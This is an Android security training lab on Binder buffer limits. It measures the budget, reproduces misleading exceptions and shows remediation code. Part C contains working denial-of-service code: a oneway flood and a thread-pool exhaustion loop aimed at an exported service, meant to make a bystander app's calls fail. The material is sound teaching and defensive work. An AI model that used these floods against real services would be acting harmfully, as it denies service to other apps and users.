# Lab 04 — Transaction limits: measure the budget, then spend someone else's

> **Difficulty:** intermediate
> **Time:** 2–3 hours
> **Needs:** `adb`, a device (no root), the NDK for Task 2, Android Studio for Parts B and C.
> **Use a device you can afford to reboot.**
> **Reading:** [README §3.3](../README.md#33-the-receive-buffer-and-the-number-behind-every-transaction-too-large), [§3.10](../README.md#310-one-way-versus-synchronous), [§3.14](../README.md#314-transaction-limits-and-transactiontoolargeexception)
> **Prerequisite labs:** [01](lab-01-service-list-and-call.md), [02](lab-02-parcel-anatomy.md)

---

## Objective

1. Measure the real per-process buffer, rather than repeating "1 MB".
2. Reproduce `TransactionTooLargeException` deliberately and find the threshold at which the *name*
   of the exception changes.
3. Explain why an intermittent `DeadObjectException` from a live service is usually this.
4. Demonstrate that the asynchronous half-budget can be exhausted **by a caller**, turning a size
   limit into an availability finding.
5. Write the remediation as code, and explain why "make the buffer bigger" is not it.

---

## Why this lab exists

`TransactionTooLargeException` is the most misdiagnosed error in Android, and the misdiagnosis has a
security consequence.

Developers meet it, discover "the Binder limit is 1 MB", pass smaller objects, and move on. Three
things in that sentence are wrong, and the fourth thing they never learn is the one that matters:

- It is not 1 MB. **Measured: 1,040,384 bytes** = 1 MiB minus two pages.
- It is not per call. It is **per process**, shared by every simultaneous incoming transaction.
- It cannot be raised. There is no setting, no manifest attribute, no system property.
- **Anyone who can send transactions to a service can consume that service's budget.** That is not a
  developer bug. That is an availability finding against whoever ships the service.

---

# Part A — Measure

## Task A1 — Read the number off the syscall

```bash
# adb shell — needs strace on the device
strace -f -s 80 service call activity 1598968902 2> /data/local/tmp/st.txt
grep -n "mmap(NULL, 10" /data/local/tmp/st.txt
```

Measured on the reference device (Android 11 / API 30, page size 4096):

```
mmap(NULL, 1040384, PROT_READ, MAP_PRIVATE|MAP_NORESERVE, 3, 0) = 0x6f98ec5000
```

Do the arithmetic:

```
1 MiB              = 1048576
2 x page size      =    8192
BINDER_VM_SIZE     = 1040384 bytes = 1016 KiB
```

**No `strace`?** Task A2 gets the same number a different way.

**Questions.**

1. Why `PROT_READ` with no `PROT_WRITE`? What does that prevent?
2. Why `MAP_NORESERVE`? What would change if it were not set?
3. The mapping is created once per process. Where, in AOSP, and by which class?

## Task A2 — Have a program compute it

```bash
# host
$NDK/aarch64-linux-android21-clang -Wall -Wextra -O2 ../examples/binder-probe.c -o /tmp/binder-probe
adb push /tmp/binder-probe /data/local/tmp/ && adb shell chmod 755 /data/local/tmp/binder-probe

# adb shell
/data/local/tmp/binder-probe | grep -A2 "mmap size"
```

```
  mmap size          : 1040384 bytes (1016 KiB)  at 0x719bdf1000
                       = 1 MiB - 2 pages; page size is 4096
```

That number was computed independently by the probe from `sysconf(_SC_PAGE_SIZE)`, and the kernel
accepted the mapping — two independent confirmations of the same value.

**Exercise.** If your device has 16 KiB pages (some newer arm64 builds do), what is the buffer size?
Compute it, then check what the probe reports.

## Task A3 — Find the async half

Read [README §3.3](../README.md#33-the-receive-buffer-and-the-number-behind-every-transaction-too-large)
and `drivers/android/binder_alloc.c`'s `binder_alloc_mmap_handler()`.

**Questions.**

1. What is `free_async_space` initialised to?
2. Which transactions draw on it?
3. If a process's async space is exhausted but its synchronous space is not, what does an ordinary
   synchronous caller observe?

This is the mechanism behind Part C, so make sure you can answer 3 before continuing.

---

# Part B — Reproduce the exception

## Task B1 — Build a target you control

An Android module with a trivially large-payload interface:

```java
// ISizeTest.aidl
interface ISizeTest {
    void  accept(in byte[] blob);              // code 1, synchronous
    oneway void acceptAsync(in byte[] blob);   // code 2, one-way
    byte[] produce(int size);                  // code 3 — the target allocates
}
```

```java
public class SizeTestService extends Service {
    private final ISizeTest.Stub mBinder = new ISizeTest.Stub() {
        private final List<byte[]> mHeld = new ArrayList<>();   // deliberate

        @Override public void accept(byte[] blob) {
            Log.i("SizeTest", "accept " + (blob == null ? -1 : blob.length));
        }
        @Override public void acceptAsync(byte[] blob) {
            Log.i("SizeTest", "async " + (blob == null ? -1 : blob.length));
            try { Thread.sleep(250); } catch (InterruptedException ignored) { }
        }
        @Override public byte[] produce(int size) {
            return new byte[size];
        }
    };
    @Override public IBinder onBind(Intent i) { return mBinder; }
}
```

```xml
<service android:name=".SizeTestService" android:exported="true" />
```

## Task B2 — Ramp the size and find the two thresholds

From an attacker app in a different process:

```java
int[] sizes = { 64*1024, 128*1024, 190*1024, 200*1024, 210*1024,
                256*1024, 512*1024, 768*1024, 900*1024, 1000*1024, 1040*1024 };
for (int n : sizes) {
    try {
        svc.accept(new byte[n]);
        Log.i("ramp", n + " OK");
    } catch (Throwable t) {
        Log.w("ramp", n + " -> " + t.getClass().getName() + ": " + t.getMessage());
    }
}
```

**Record the exact class name at each size.** You are looking for two boundaries:

| Boundary | What changes |
|---|---|
| Around **200 KiB** | The *name* of the exception changes — see B3 |
| Somewhere below **1016 KiB** | The transaction actually starts failing |

The second boundary is below 1016 KiB, not at it, because the parcel carries the interface token, the
array length, alignment padding, and because the target may already hold other buffers. **Record
where yours lands and why it is not exactly 1040384.**

## Task B3 — The 200 KiB heuristic

This is the part nobody knows.

`signalExceptionForError()` in `frameworks/base/core/jni/android_util_Binder.cpp` receives
`FAILED_TRANSACTION` from the driver and has to guess what went wrong, because **the driver does not
tell it**:

- Outgoing parcel **larger than 200 KiB** → `TransactionTooLargeException`, with the parcel size in
  the message.
- **Otherwise** → `DeadObjectException`, or `RuntimeException` where a checked exception is not
  allowed, with a message saying the remote process probably died — and explicitly admitting the
  cause could instead be running out of binder buffer space.

The AOSP source carries a comment saying that transaction-too-large is the most common reason for
`FAILED_TRANSACTION` but not the only one, and that the driver does not currently let userspace tell
the cases apart.

**Demonstrate it.** Make a **small** call fail. Two ways:

1. Have `produce(int)` return a huge array — the *reply* is what overflows, and the *request* was
   tiny.
2. Fill the target's buffer with held-open data first (Task B4), then make an ordinary small call.

```java
try {
    byte[] r = svc.produce(900 * 1024);
    Log.i("reply", "got " + r.length);
} catch (Throwable t) {
    Log.w("reply", t.getClass().getName() + ": " + t.getMessage());   // note the CLASS
}
```

**The finding to write down:** a small call that fails reports as `DeadObjectException` even though
the target is alive. That is the diagnostic trap.

## Task B4 — Make buffers stay held

Add to the service a path that retains a `Cursor` or a large `Bundle` and never releases it, then
run the ramp again. Watch the failure threshold fall as other traffic occupies the shared budget.

**Question.** Why does the failure appear at the *caller*, when the exhaustion is at the *callee*?
Answer from [README §3.14](../README.md#314-transaction-limits-and-transactiontoolargeexception),
not from intuition.

## Task B5 — Build the diagnostic table

Fill this in from your own measurements. It is the deliverable of Part B.

| Symptom | Java exception | Real cause | How you confirmed it |
|---|---|---|---|
| 900 KiB request | | | |
| 1 KiB request while target is loaded | | | |
| Small request, 900 KiB reply | | | |
| Small request, healthy target, target killed mid-call | | | |

---

# Part C — The availability finding

> **Read this before running anything in Part C**
> You are about to deliberately exhaust another process's Binder budget. Against `system_server`
> that is a device-wide denial of service and the device may reboot or need a factory reset. **Point
> this at your own `SizeTestService` and at nothing else** unless you have written authorisation and
> a device you can lose.

## Task C1 — Exhaust the async half

`oneway` transactions draw on **half** the buffer, tracked separately, and the caller gets no
backpressure at all — `BR_TRANSACTION_COMPLETE` means "queued", not "handled".

```java
// attacker app
final byte[] blob = new byte[200 * 1024];
new Thread(() -> {
    for (int i = 0; i < 10000; i++) {
        try {
            svc.acceptAsync(blob);      // oneway: returns immediately
        } catch (Throwable t) {
            Log.w("flood", i + " -> " + t);
            break;
        }
    }
}).start();
```

Because `acceptAsync` sleeps 250 ms, the target drains far slower than you fill. Watch its async
budget go.

## Task C2 — Observe the collateral damage

**This is the step that turns a curiosity into a finding.** While the flood runs, make an *ordinary,
small, synchronous* call from a **third** app:

```java
try {
    svc.accept(new byte[16]);
    Log.i("victim", "fine");
} catch (Throwable t) {
    Log.e("victim", "FAILED: " + t);      // <-- a bystander, denied service
}
```

If the third app's tiny call fails, you have demonstrated that **one caller can deny service to
every other caller of that service**, with no permission, from an unprivileged app.

## Task C3 — Try the thread pool instead

A second, independent route to the same outcome. Make `accept()` slow (a 10-second sleep), then have
16 attacker threads call it synchronously. The seventeenth caller — anyone at all — waits.

```java
for (int i = 0; i < 20; i++) {
    new Thread(() -> {
        while (true) { try { svc.accept(new byte[16]); } catch (Throwable ignored) {} }
    }).start();
}
```

**Question.** The libbinder default pool is 15 threads plus the main looper. Which of the two attacks
— buffer or pool — is easier to defend against, and why?

## Task C4 — Check for the spam detector

Android 12 added `BR_ONEWAY_SPAM_SUSPECT` and `BINDER_ENABLE_ONEWAY_SPAM_DETECTION`, so the driver
can warn a process that one sender is monopolising its async space.

```bash
# adb shell
getprop ro.build.version.sdk
logcat -d | grep -i "oneway\|spam" | head
```

On API 30 (the reference device) there is nothing. On API 31+ look for the warning. **Record which
your device is**, because it changes the remediation advice you give.

## Task C5 — Write the remediation

Not prose — code. Then explain why each line is there.

```java
@Override
public boolean onTransact(int code, Parcel data, Parcel reply, int flags)
        throws RemoteException {
    // 1. Reject oversized transactions BEFORE parsing anything.
    if (data.dataSize() > MAX_PAYLOAD) {
        throw new IllegalArgumentException("payload " + data.dataSize());
    }
    // 2. Rate-limit per caller, on the one identifier that cannot be forged.
    final int uid = Binder.getCallingUidOrThrow();
    if (!mLimiter.allow(uid)) {
        throw new IllegalStateException("rate limited");
    }
    return super.onTransact(code, data, reply, flags);
}
```

and, for the large-data case, stop sending it through Binder at all:

| Instead of | Do this |
|---|---|
| A large `byte[]` or `Bitmap` | An `ashmem`/`memfd` descriptor the receiver maps |
| 10,000 provider rows | A `Cursor`, which pages through a `CursorWindow` |
| A giant `Bundle` in an extra | A `content://` URI plus a permission grant |
| Retained `Cursor`s | `try (Cursor c = …)` |

**Question.** Why is "raise the buffer size" not on that list? Answer with the design argument, not
just "there is no setting". [README §10, Principal Engineer](../README.md#principal-engineer) has the
shape of it.

## Task C6 — Write it up properly

Draft the finding. It should contain:

- **Title.** Not "app crashes". Something like *"Unauthenticated Binder buffer exhaustion in
  `com.example.SizeTestService` denies service to all clients"*.
- **Precondition.** The service is exported with no permission; any app can bind.
- **Mechanism.** Per-process 1,040,384-byte budget, half of it for `oneway`; no size check; no rate
  limit.
- **Evidence.** Your ramp table, the flood, and the *bystander* call failing.
- **Impact.** Which other callers are affected, and for how long after the flood stops.
- **Severity.** Availability. Argue it honestly — if the service is non-essential, say so.
- **Remediation.** The code above.

> **Pentester's Note**
> The reason this gets filed as "the app crashes sometimes" and closed is that the reporter never
> demonstrated the bystander. One caller failing looks like the caller's problem. A *third party*
> failing is unambiguous, and it is one extra app to write.

---

## Task D — Answer these without looking

1. What is the buffer size, exactly, on a 4 KiB-page device, and how is it derived?
2. Per what? Not "per call" — say what.
3. What fraction is available to `oneway` transactions?
4. At what parcel size does the *name* of the exception change, and to what?
5. Why can a *small* call fail with `DeadObjectException` against a *live* service?
6. Where does the failure surface — caller or callee — and why is that the wrong end?
7. Name three things that keep binder buffers held open in an ordinary app.
8. Give two independent ways an unprivileged caller can deny service to a reachable service.
9. Why is `oneway` flooding harder for the caller to notice than synchronous flooding?
10. Name the two remediation controls, and say why enlarging the buffer is not one.

---

## Success criteria

- [ ] You measured the buffer size two ways and both gave 1,040,384 (or the correct value for your
      page size).
- [ ] You reproduced `TransactionTooLargeException` and recorded the size at which it appeared.
- [ ] You produced a `DeadObjectException` from a **small** call against a **live** service, and can
      explain the 200 KiB heuristic that caused the different name.
- [ ] Your diagnostic table is complete, from your own measurements.
- [ ] You demonstrated a **bystander** failing while a flood was in progress.
- [ ] You wrote the remediation as code and can defend each line.
- [ ] You can explain why there is no buffer-size setting and why that is defensible.

---

## Next

[Lab 05 — CTF: The Unmarked Code](lab-05-ctf-the-unmarked-code.md) — a service with no interface
descriptor, one undocumented transaction code, and a guard that is almost right.
